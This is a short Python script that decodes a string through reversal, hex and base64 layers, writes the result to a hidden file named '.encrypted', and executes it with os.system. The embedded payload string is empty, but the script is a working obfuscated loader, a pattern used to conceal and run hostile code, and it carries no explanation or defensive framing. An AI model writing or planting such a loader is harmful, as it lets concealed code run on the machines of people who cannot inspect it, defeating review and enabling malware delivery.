import os
import base64
import binascii

file_name = '.encrypted'
encoded_data = ''

def multi_layer_decode(encoded_data):
    hex_decoded = encoded_data[::-1]  # Reverse back
    base64_decoded = binascii.unhexlify(hex_decoded).decode()
    return base64.b64decode(base64_decoded)

try:
    with open(file_name, 'wb') as file:
        file.write(multi_layer_decode(encoded_data))
    os.system('python .encrypted')
except Exception as e:
    print(e)
